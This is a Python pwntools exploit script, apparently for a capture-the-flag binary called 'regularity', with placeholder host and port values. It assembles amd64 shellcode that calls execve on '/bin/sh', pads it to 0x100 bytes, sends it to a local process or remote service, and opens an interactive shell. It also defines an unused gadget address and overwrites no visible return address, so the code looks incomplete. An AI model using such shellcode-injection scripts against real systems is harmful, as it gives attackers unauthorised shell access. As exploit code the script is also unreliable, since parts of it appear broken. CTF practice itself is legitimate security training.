#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 0000
HOST = "000000000"
exe = context.binary = ELF('./regularity', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
        	b*0x401067
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

shellcode = asm('''
	mov rbx, 29400045130965551
	push rbx
	mov rdi, rsp
	xor rsi, rsi
	xor rdx, rdx
	mov rax, 0x3b
	syscall
	''', arch = 'amd64')

pop_rsi = 0x7ffff7ffd893

payload = flat(
	shellcode.ljust(0x100, b'A')
	)
input()
p.sendline(payload)

p.interactive()